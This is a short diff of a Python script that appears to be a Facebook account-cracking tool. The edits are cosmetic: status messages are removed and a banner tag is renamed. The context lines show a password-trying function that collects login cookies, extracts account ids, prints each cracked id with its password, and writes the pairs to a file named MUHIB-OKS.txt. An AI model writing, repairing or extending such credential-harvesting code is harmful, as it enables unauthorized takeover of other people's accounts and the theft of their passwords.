@@ -133,14 +133,11 @@ try:
         print(f'[>]  MAINTENANCE BREAK RUNNING\n')
         sys.exit()
     if "off" in xnx:
-        print(f'{P}[>] {H}TOOL IS OFF NOW ')
         sys.exit()
     if "update" in xnx:
         for up in range(999):
-            print(" \033[1;92m  PLEASE WAIT YOUR NEXT UPDATE ")
             time.sleep(0.01)
     if "server" in xnx:
-        print('SERVER IS OFF')
         sys.exit()
 except requests.exceptions.ConnectionError:
     print("FIX YOUR INTERNET BRUH")
@@ -270,7 +267,7 @@ def FIRE(ids,pwv,tl):
                     cok.update({x["name"]:x["value"]})
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                 ids = re.findall('c_user=(.*);xs', kuki)[0]
-                print(f'\r\033[1;91m  [\033[1;92mMUHIB-💚\033[1;91m]\033[1;92m\x1b[38;2;202m '+ids+' \033[1;97m| \033[1;92m\x1b[38;2;202m'+pas+'\033[1;92m')
+                print(f'\r\033[1;91m  [\033[1;92mLOVE-💚\033[1;91m]\033[1;92m\x1b[38;2;202m '+ids+' \033[1;97m| \033[1;92m\x1b[38;2;202m'+pas+'\033[1;92m')
                 oks.append(ids)
                 open('/sdcard/MUHIB-OKS.txt','a').write(ids+' | '+pas+'\n')
                 break
